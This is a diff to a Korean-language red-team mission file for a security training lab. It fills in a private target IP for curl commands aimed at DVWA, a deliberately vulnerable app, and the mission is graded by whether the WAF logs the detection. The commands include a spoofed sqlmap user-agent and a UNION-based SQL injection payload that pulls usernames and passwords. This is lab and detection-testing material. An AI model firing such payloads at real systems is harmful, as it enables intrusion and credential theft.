@@ -46,12 +46,12 @@ red_missions:
       ```bash
       # 1) 스캐너 UA 로 정찰 흔적 남기기
       curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
-        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa01r1-kim&Submit=Submit"
+        "http://192.168.0.161/vulnerabilities/sqli/?id=sa01r1-kim&Submit=Submit"
       # 2) UNION 기반 SQLi 한 발 (태그 포함)
       curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
-        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa01r1-kim%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
+        "http://192.168.0.161/vulnerabilities/sqli/?id=sa01r1-kim%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
       ```
-      `<대상_공개IP>` 는 solo 면 본인 인프라 IP, duel 이면 상대 인프라 IP 다.
+      `192.168.0.161` 는 solo 면 본인 인프라 IP, duel 이면 상대 인프라 IP 다.
 
       ### 채점 방법
       대상 WAF audit(modsec)에 **태그 `sa01r1` 가 포함된 SQLi/스캐너 탐지(룰 913/942 계열)** 가 남았는지로
